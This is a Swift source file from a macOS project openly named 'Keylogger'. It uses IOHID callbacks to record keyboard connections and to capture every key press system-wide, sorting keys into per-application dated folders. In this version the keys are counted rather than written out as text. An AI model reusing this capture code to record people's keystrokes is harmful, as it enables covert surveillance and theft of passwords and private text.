//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        let path = mySelf.devicesData.appendingPathComponent(dateFolder)
        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        
        let fileName = path.appendingPathComponent("Time Stamps").path
        if !FileManager.default.fileExists(atPath: fileName )
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File!")
            }
        }
        let timeStamp = "Connected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
            
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
            let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
            let path = mySelf.devicesData.appendingPathComponent(dateFolder)
            if !FileManager.default.fileExists(atPath: path.path)
            {
                do
                {
                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
                }
                catch
                {
                    print("Can't Create Folder")
                }
            }
            
            let fileName = path.appendingPathComponent("Time Stamps").path
            if !FileManager.default.fileExists(atPath: fileName )
            {
                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
                {
                    print("Can't Create File!")
                }
            }
            let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
    }
     
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        var test: Bool
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );
        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        var path = mySelf.keyData.appendingPathComponent(dateFolder)
//        print("Handle_IOHIDInputValueCallback", path)

        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        let fileName = path.appendingPathComponent(mySelf.appName).path
        if CallBackFunctions.prev == fileName
        {
            test = false
        }
        else
        {
            test = true
            CallBackFunctions.prev = fileName
        }
        if !FileManager.default.fileExists(atPath: fileName)
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File")
            }
        }
        if test
        {
            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
        }
Outside:if pressed == 1
        {
            if scancode == 57
            {
                CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                break Outside
            }
            if scancode >= 224 && scancode <= 231
            {
                break Outside
            }
            if CallBackFunctions.CAPSLOCK
            {
                if scancode >= 0 && scancode <= 100 {
                    let d = AppDelegate()
                    d.keyCountUp(key: mySelf.keyMap[scancode]![1])
                }
            }
            else
            {
                if scancode >= 0 && scancode <= 100 {
                    print("else:", scancode)
                    let d = AppDelegate()
                    d.keyCountUp(key: mySelf.keyMap[scancode]![0])
                }
            }
            
        }
    }
}
